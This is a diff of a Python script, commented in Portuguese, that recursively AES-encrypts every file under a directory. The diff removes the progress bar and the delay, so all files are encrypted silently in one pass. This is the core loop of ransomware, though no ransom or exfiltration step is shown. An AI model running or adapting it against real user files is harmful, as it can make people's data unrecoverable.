@@ -2,7 +2,6 @@ import os
 import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-from tqdm import tqdm
 
 def encrypt_file(file_path, key):
     """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
@@ -34,12 +33,8 @@ def encrypt_file(file_path, key):
 
 def scan_and_encrypt(directory, key):
     """Escaneia o diretório e criptografa os arquivos"""
-    files_to_encrypt = []
     for root, _, files in os.walk(directory):
         for file in files:
             if not file.endswith('.enc'):
-                files_to_encrypt.append(os.path.join(root, file))   
-
-    for file_path in tqdm(files_to_encrypt, desc="Criptografando arquivos", unit="arquivo"):
-        encrypt_file(file_path, key)
-        time.sleep(0.1)
+                file_path = os.path.join(root, file)   
+                encrypt_file(file_path, key)
